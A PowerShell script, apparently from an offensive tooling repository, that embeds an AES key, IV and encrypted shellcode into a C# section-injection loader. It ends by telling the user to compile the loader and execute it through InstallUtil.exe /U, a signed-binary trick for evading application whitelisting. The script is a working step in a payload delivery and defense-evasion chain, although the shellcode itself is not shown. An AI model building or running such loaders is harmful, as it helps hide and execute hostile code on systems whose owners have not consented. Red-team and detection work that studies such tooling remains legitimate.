<#
.SYNOPSIS
  Integrates AES encryption data (AesKey, AesIV, EncryptedShellcode) from aes_data.cs
  into the InstallUtil section-injection Loader.cs.

.DESCRIPTION
  Reads the three byte[] arrays emitted by shellcode-gen/aes-encrypt-shellcode.ps1
  (AesKey, AesIV, EncryptedShellcode) and replaces the matching arrays inside
  installutil/section-injection/Loader.cs. A timestamped backup of Loader.cs is
  written before any change is made.

.EXAMPLE
  .\aes-integrate-loader.ps1
  .\aes-integrate-loader.ps1 -LoaderPath .\installutil\section-injection\Loader.cs -AesDataPath .\test\aes_data.cs
#>
param(
    [string]$LoaderPath  = ".\installutil\section-injection\Loader.cs",
    [string]$AesDataPath = ".\shellcode-gen\aes_data.cs"
)

$ErrorActionPreference = 'Stop'

Write-Host "=== AES-Loader Integration Script ===" -ForegroundColor Cyan
Write-Host ""

# -- Resolve to absolute paths (handle relative paths correctly) -------------
if (-not [IO.Path]::IsPathRooted($LoaderPath))  { $LoaderPath  = Join-Path (Get-Location) $LoaderPath }
if (-not [IO.Path]::IsPathRooted($AesDataPath)) { $AesDataPath = Join-Path (Get-Location) $AesDataPath }
$LoaderPath  = [IO.Path]::GetFullPath($LoaderPath)
$AesDataPath = [IO.Path]::GetFullPath($AesDataPath)

# -- Validate input files exist ----------------------------------------------
if (-not (Test-Path -LiteralPath $LoaderPath)) {
    Write-Host "ERROR: Loader.cs not found at: $LoaderPath" -ForegroundColor Red
    exit 1
}
if (-not (Test-Path -LiteralPath $AesDataPath)) {
    Write-Host "ERROR: aes_data.cs not found at: $AesDataPath" -ForegroundColor Red
    Write-Host "  Generate it first:" -ForegroundColor Yellow
    Write-Host "  .\shellcode-gen\aes-encrypt-shellcode.ps1 -InputFile shellcode.bin -OutputFile aes_data.cs" -ForegroundColor Yellow
    exit 1
}

# -- Read AES data file -------------------------------------------------------
Write-Host "Reading AES data: $AesDataPath" -ForegroundColor Yellow
$AesContent = Get-Content -LiteralPath $AesDataPath -Raw

# -- Extract the three arrays (single-line, terminated with '};') -------------
$rxOpts = [System.Text.RegularExpressions.RegexOptions]::Singleline
$extracted = @{}
foreach ($name in @('AesKey','AesIV','EncryptedShellcode')) {
    $pattern = 'private static readonly byte\[\] ' + $name + ' = .*?\};'
    $m = [regex]::Match($AesContent, $pattern, $rxOpts)
    if (-not $m.Success) {
        Write-Host "ERROR: Could not extract '$name' from $AesDataPath" -ForegroundColor Red
        exit 1
    }
    $extracted[$name] = $m.Value
}

Write-Host "Extracted from aes_data.cs:" -ForegroundColor Green
foreach ($name in @('AesKey','AesIV','EncryptedShellcode')) {
    Write-Host ("  - {0,-19}: {1} chars" -f $name, $extracted[$name].Length) -ForegroundColor Gray
}
Write-Host ""

# -- Read Loader.cs -----------------------------------------------------------
Write-Host "Reading Loader.cs: $LoaderPath" -ForegroundColor Yellow
$LoaderContent = Get-Content -LiteralPath $LoaderPath -Raw

# -- Backup original Loader.cs ------------------------------------------------
$LoaderDir  = Split-Path -Parent $LoaderPath
$BackupPath = Join-Path $LoaderDir ("Loader_backup_{0}.cs" -f (Get-Date -Format 'yyyyMMdd_HHmmss'))
Copy-Item -LiteralPath $LoaderPath -Destination $BackupPath -Force
Write-Host "Backup created: $BackupPath" -ForegroundColor Gray

# -- Replace the three arrays in place (handles single- and multi-line arrays) --
$replaced = @{ AesKey = $false; AesIV = $false; EncryptedShellcode = $false }
foreach ($name in @('AesKey','AesIV','EncryptedShellcode')) {
    $pattern = 'private static readonly byte\[\] ' + $name + ' = .*?\};'
    $m = [regex]::Match($LoaderContent, $pattern, $rxOpts)
    if (-not $m.Success) {
        Write-Host "ERROR: '$name' array declaration not found in Loader.cs - aborting" -ForegroundColor Red
        exit 1
    }
    # splice the new (single-line) array in place of the old declaration
    $LoaderContent = $LoaderContent.Remove($m.Index, $m.Length).Insert($m.Index, $extracted[$name])
    $replaced[$name] = $true
}

# -- Write back to Loader.cs --------------------------------------------------
Set-Content -LiteralPath $LoaderPath -Value $LoaderContent -Encoding ASCII
Write-Host "Wrote integrated Loader.cs" -ForegroundColor Yellow
Write-Host ""

# -- Validate written output --------------------------------------------------
$verify = Get-Content -LiteralPath $LoaderPath -Raw
Write-Host "Validation:" -ForegroundColor Cyan
foreach ($name in @('AesKey','AesIV','EncryptedShellcode')) {
    if ($verify.Contains($extracted[$name])) {
        Write-Host "  - $name embedded correctly" -ForegroundColor Green
    } else {
        Write-Host "  - WARNING: $name does not match source after write" -ForegroundColor Yellow
    }
}

Write-Host ""
Write-Host "=== Integration Complete ===" -ForegroundColor Green
Write-Host "Next steps:" -ForegroundColor Cyan
Write-Host "  1. Compile : .\installutil\section-injection\compile.bat" -ForegroundColor White
Write-Host "  2. Execute : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U loader.exe" -ForegroundColor White
